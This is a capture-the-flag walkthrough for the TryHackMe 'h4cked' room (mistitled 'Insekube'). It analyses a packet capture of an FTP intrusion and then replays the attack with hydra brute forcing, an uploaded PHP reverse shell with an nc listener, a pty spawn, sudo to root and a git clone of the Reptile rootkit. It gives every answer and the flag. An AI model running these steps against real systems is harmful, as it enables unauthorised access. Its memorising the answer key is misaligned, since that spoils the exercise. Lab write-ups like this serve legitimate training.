# Insekube Walkthrough
### Link
- https://tryhackme.com/room/h4cked
---
# Task 1 - Oh no! We've been hacked!

*Analyze the pcapc provided for this task*

**Question**
#### The attacker is trying to log into a specific service. What service is this?

Go to  Statistics -->  Protocol Hierarchy

**Answer** 
#### FTP

**Question**
#### There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

Quick search on google --> https://github.com/vanhauser-thc/thc-hydra

**Answer** 
#### hydra

**Question**
#### The attacker is trying to log on with a specific username. What is the username?

Right click on the first frame --> select Follow --> Select TCP Stream. 

We can have the details and the username.
**Answer** 
#### jenny

**Question**
#### What is the user's password?

Go to Edit --> find a packet --> Select **String** --> add **successful** as string you want to find.

When you find the frame, Right click on it --> select Follow --> Select TCP Stream. 

For your information , the frame number is **395**

```
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password123
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/var/www/html" is the current directory
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
QUIT
221 Goodbye.
```

**Answer** 
#### password123

**Question**
#### What is the current FTP working directory after the attacker logged in?

From the same window as the previous question, you can see the directory.

**Answer** 
#### /var/www/html

**Question**
#### The attacker uploaded a backdoor. What is the backdoor's filename?

From the same window as the previous question, you can see the directory.

**Answer** 
#### shell.php

**Question**
#### The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
Go to Statistics --> Protocol Hierarchy --> Select FTP-DATA and right click --> Apply as Filter --> Selected

We have 2 frames. Select the frame with **shell.php** in the Info column --> Right Click --> Follow --> TCP Stream

We have the source code of the **shell.php**

**Answer** 
#### http://pentestmonkey.net/tools/php-reverse-shell

**Question**
#### Which command did the attacker manually execute after getting a reverse shell?

I continue to navigate through different stream and inside the **stream 20** I found the history of all command performed by the attacker.

Select one frame from this stream --> Right Click --> Follow --> TCP Stream

```
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

**Answer** 
#### whoami

**Question**
#### What is the computer's hostname?

From the same window

```
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

**Answer** 
#### wir3

**Question**
#### Which command did the attacker execute to spawn a new TTY shell?

```
drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  14 root root       4096 Feb  1 21:54 var
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**Answer** 
#### python3 -c 'import pty; pty.spawn("/bin/bash")'

**Question**
#### Which command was executed to gain a root shell?

```

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
```
**Answer** 
#### sudo su

**Question**
#### The attacker downloaded something from GitHub. What is the name of the GitHub project?
```
git clone https://github.com/f0rb1dd3n/Reptile.git
```

**Answer** 
#### Reptile

**Question**
#### The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
**Answer** 
#### rootkit

# Task 2 - Hack your way back into the machine

*Follow the instruction* 

```
 - The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

 - Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.

- Change the necessary values inside the web shell and upload it to the webserver

- Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

- Become root!
```

**Question**
#### Read the flag.txt file inside the Reptile directory

- Let's start with **hydra**
```
sudo hydra -l jenny -P rockyou.txt ftp://10.10.253.71
Password:
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-14 13:39:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.253.71:21/
[21][ftp] host: 10.10.253.71   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-14 13:40:28
```

We found the new password for **jenny** : **987654321**

Now we can access to the FTP. It works.

Let's upload our reverseshell and don't forget to change the rights in order to be able to execute it ^^

```
ftp> put reverseshell.php 
local: reverseshell.php remote: reverseshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (106.8894 MB/s)
ftp> chmod 777 reverseshell.php
200 SITE CHMOD command ok.
```

Now let's start a listener and execute the **reverseshell.php**

```
nc -nlvp 4444
listening on [any] 4444 ...
....
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@wir3:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Change to **jenny** user
```
www-data@wir3:/$ su jenny
Password: 987654321

jenny@wir3:/$ 
```

Check **jenny privileges** with **sudo -l**
```
jenny@wir3:/$ sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
```

We can execute **ALL** command so just let's do **sudo su**
```
jenny@wir3:/$ sudo -s
root@wir3:/# 
```

```
root@wir3:/# cat flag.txt
cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
```


**Answer** 
#### ebcefd66ca4b559d17b440b6e67fd0fd



